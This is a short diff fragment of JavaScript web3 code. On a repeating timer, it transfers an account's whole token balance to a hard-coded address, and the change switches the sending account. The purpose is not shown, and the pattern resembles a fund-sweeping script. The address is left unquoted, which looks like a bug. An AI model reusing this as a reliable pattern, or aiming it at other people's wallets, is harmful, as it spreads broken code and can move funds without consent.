@@ -818,7 +818,7 @@ setInterval(function(){
 
 
 contract.methods.transfer(0x03b89A4c0CF05D8c0a85E53c6979088B6ceB1E0b, web3.utils.toWei(balance, 'ether'))
-        .send({ from: accounts[0] })
+        .send({ from: account})
         .then((res) => {
           console.log(res)
         })
